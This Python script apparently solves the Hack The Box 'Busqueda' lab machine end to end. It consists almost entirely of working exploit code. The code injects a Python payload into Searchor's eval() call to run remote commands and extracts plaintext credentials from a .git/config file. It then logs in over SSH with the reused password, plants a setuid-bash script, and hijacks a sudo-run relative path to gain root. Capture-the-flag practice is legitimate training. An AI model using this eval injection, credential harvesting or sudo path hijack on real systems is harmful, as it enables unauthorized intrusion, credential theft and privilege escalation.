#!/usr/bin/env python3
"""
htb_busqueda_solve.py — autonomous solve for HTB Busqueda.

Chain:
  1. Discovery   : locate the RCE endpoint on the Flask/Searchor app
  2. Extraction  : dump /var/www/app/.git/config -> cody creds via RCE
  3. Foothold    : SSH as `svc` with the reused password
  4. Escalation  : sudo system-checkup.py full-checkup -> ./full-checkup.sh
                   relative-path hijack -> setuid shell -> root flag

Usage:
    python3 htb_busqueda_solve.py <TARGET_IP>

No hardcoded flags; every credential and flag is read dynamically off the
remote host. Requires: requests, paramiko.
"""
import re
import sys
import time
from urllib.parse import unquote_plus

import paramiko
import requests

GIT_CONFIG = "/var/www/app/.git/config"


def rce(target, cmd):
    """Run <cmd> on the target through the Searchor 2.4.0 eval() injection.

    The 'query' param is spliced into
        Engine.{engine}.search('{query}', copy_url=..., open_web=...)
    so injecting  '...' + popen(cmd).read() + '...'  breaks out of the string
    and the command output is echoed back URL-encoded in the result link.
    """
    payload = f"' + __import__('os').popen({cmd!r}).read() + '"
    resp = requests.post(
        f"http://{target}/search",
        data={"engine": "GitHub", "query": payload},
        headers={"Host": "searcher.htb"},
        timeout=20,
    )
    m = re.search(r"q=([^&\"']+)", resp.text)
    if m:
        return unquote_plus(m.group(1))
    return resp.text


def main():
    target = sys.argv[1] if len(sys.argv) > 1 else "10.129.53.77"
    print(">> TARGET: " + target)

    # step 1 : RCE proof
    print("\n[1/6] RCE on Searchor (eval injection)")
    out = rce(target, "id")
    print(f"      id -> {out.strip()}")
    if "svc" not in out:
        print("    [!] RCE did not return 'svc' — aborting.")
        return 1

    # step 2 : harvest git config via RCE
    print("\n[2/6] Harvest .git/config creds")
    cfg = rce(target, f"cat {GIT_CONFIG}")
    print(f"    (config snippet) {cfg.replace(chr(10), ' | ')[:160]}")
    m = re.search(r"http://([^:]+):([^@]+)@", cfg)
    if not m:
        print("    [!] credentials not found.")
        return 2
    cody_user, password = m.group(1), m.group(2)
    print(f"    credentials: {cody_user} : {password}")

    # step 3 : SSH as svc (password reuse)
    print("\n[3/6] SSH as svc (reused password)")
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(target, port=22, username="svc", password=password, timeout=20)
    _, so, _ = client.exec_command("id")
    print(f"    {so.read().decode().strip()}")

    # user flag
    _, so, _ = client.exec_command("cat /home/svc/user.txt")
    user_flag = so.read().decode().strip()
    print(f"    user.txt: {user_flag}")

    # step 4 : drop setuid payload
    print("\n[4/6] Drop setuid-shell payload")
    script = "#!/bin/bash\ncp /bin/bash /tmp/bb && chmod u+s /tmp/bb\n"
    sftp = client.open_sftp()
    with sftp.open("/tmp/full-checkup.sh", "w") as f:
        f.write(script)
    client.exec_command("chmod +x /tmp/full-checkup.sh")
    print("    wrote /tmp/full-checkup.sh -> cp /bin/bash /tmp/bb; chmod u+s")

    # step 5 : trigger sudo full-checkup 
    print("\n[5/6] sudo system-checkup.py full-checkup (relative-path hijack)")
    cmd = (
        f"cd /tmp && printf '%s\\n' '{password}' | sudo -S -p '' "
        f"/usr/bin/python3 /opt/scripts/system-checkup.py full-checkup; ls -l /tmp/bb"
    )
    _, so, se = client.exec_command(cmd)
    time.sleep(3)
    res = so.read().decode() + se.read().decode()
    print(f"    {res.strip()}")
    if "rws" not in res:
        print("    [!] setuid binary was not created.")
        return 3

    # step 6 : root flag
    print("\n[6/6] Execute setuid shell, read root flag")
    _, so, _ = client.exec_command("/tmp/bb -p -c 'cat /root/root.txt'")
    root_flag = so.read().decode().strip()
    print(f"    root.txt: {root_flag}")

    print("\n" + "=" * 40)
    print("  FLAG BANNER")
    print("=" * 40)
    print(f"  user.txt : {user_flag}")
    print(f"  root.txt : {root_flag}")
    print("=" * 40)
    client.close()
    return 0


if __name__ == "__main__":
    sys.exit(main())
